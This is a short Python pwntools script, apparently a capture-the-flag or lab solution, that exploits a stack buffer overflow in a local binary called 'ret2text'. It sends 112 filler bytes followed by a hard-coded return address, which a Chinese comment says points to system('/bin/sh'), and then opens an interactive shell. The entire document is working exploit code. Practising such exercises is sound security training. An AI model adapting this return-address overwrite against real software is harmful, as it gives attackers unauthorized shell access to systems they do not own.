from pwn import *
p=process('./ret2text')
addr=0x0804863A #在反汇编分析中找到system("/bin/sh")的地址
p.sendlineafter("anything?",b'a'*112+p32(addr))#填充缓冲区  
p.interactive()
